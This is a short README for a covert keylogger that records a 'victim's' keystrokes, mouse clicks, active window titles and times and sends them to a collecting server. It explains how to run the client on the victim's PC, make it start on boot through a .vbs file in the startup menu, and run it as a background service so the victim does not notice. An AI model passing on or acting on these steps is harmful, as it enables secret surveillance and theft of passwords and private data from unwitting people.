## Introduction
	the code will record  the mouse's position and the keyboard words when the victim 
	click the mouse or press the keyboard. What's more, the recorder can give you the 
	window info which the victim visit now and the exact time of the monitor trace.

 
## Usage
	use ` python server.py ` to run the server code on the server to recerive the data
	
	use ` python record.py ` to run the client code on the victim's PC
	Here offer the EXE version, put the .vbs file in the Operate System's start menu in 
	order to make it start itself when the OS starts. Also ,the .vbs file can make the 
	record program run as a service process, so the victim is difficult to discover the 
	monitor behavior.
